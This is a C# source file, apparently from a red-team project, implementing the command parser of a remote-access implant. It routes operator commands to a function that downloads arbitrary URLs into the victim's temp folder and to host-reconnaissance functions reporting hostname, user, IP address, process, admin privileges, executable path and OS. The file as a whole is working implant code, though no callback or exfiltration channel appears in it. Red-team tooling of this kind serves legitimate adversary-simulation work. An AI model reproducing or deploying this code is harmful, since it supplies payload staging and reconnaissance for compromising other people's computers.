using System;
using System.Linq;


namespace RedTeamDevelop
{

    class Operation
    {
        GeneralInfo ninstance;
        //constructor
        public Operation(GeneralInfo instance)
        {

            this.ninstance = instance;
        }       

        public void CommandParser(string cmd){
        //example command: download url
            string command = cmd.Split(" ")[0];
            string argument = cmd.Split(" ")[1];
            if (command.Contains("download")) {
                DownloadFile(argument);
            }
            else if (command.Contains("cd")) {
                SetWorkingDirectory(argument);
            }
            else if (command.Contains("ls")) {
                EnumWorkingDirectory(argument);
            }
            else if (command.Contains("hostname")){
                GetHostName();
            }
            else if (command.Contains("osinfo")){
                GetOsInfo();
            }
            else if (command.Contains("processinfo")) {
                GetProcessInfo();
            }
            else if (command.Contains("pwd")){
                GetWorkingDirectory();
            }
            else if (command.Contains("ipaddress")){
                GetIpv4Address();
            }
            else if (command.Contains("privileges")){
                GetPrivileges();
            }
            else if (command.Contains("execpath")) {
                GetExecpath();
            }
            else if (command.Contains("username")) {
                GetUserName();
            }
        }

        public void DownloadFile(string url)
        {
        System.Net.WebClient wInstance = new System.Net.WebClient();
            string tempPath = System.IO.Path.GetTempPath();
            //C:\users\adsfas\adsfasdf\
            //google.com\index.html
            string filename  = url.Split('/')[url.Split('/').Length-1];
            string savePath = tempPath + filename;
        
            wInstance.DownloadFile(url, savePath);
        }

        //function to change directory
        public void SetWorkingDirectory(string path)
        {
            System.IO.Directory.SetCurrentDirectory(path);
        }

        //listing file files and folders
        public string EnumWorkingDirectory(string path)
        {
            //returns collections types must use System.Linq namespace
            System.Text.StringBuilder sbInstance = new System.Text.StringBuilder();
            var dirs = from line in System.IO.Directory.EnumerateDirectories(path) select line;
            foreach(var dir in dirs) {
                sbInstance.Append(dir);
                sbInstance.Append(Environment.NewLine);
            }

            var files = from line in System.IO.Directory.EnumerateFiles(path) select line;
            foreach(var file in files) {
                sbInstance.Append(file);
                sbInstance.Append(Environment.NewLine);
            }

            //converting it to string
            string dirsAndFiles = sbInstance.ToString();

            return dirsAndFiles;
        }

        public string GetHostName(){
            return ninstance.hostName;
        }

        public string GetUserName(){return ninstance.uName;}
        public string GetIpv4Address(){return ninstance.ipv4address;}
        public string GetProcessInfo(){return ninstance.pName + " "+ ninstance.pId;}
        
        public string GetPrivileges(){
            return ninstance.isAdmin.ToString();
        }
        
        public string GetWorkingDirectory(){
            return ninstance.cDirectory;
        }

        public string GetExecpath(){
            return ninstance.ePath;
        }
        public string GetOsInfo(){
            return ninstance.oSystem;
        }

    }
    
}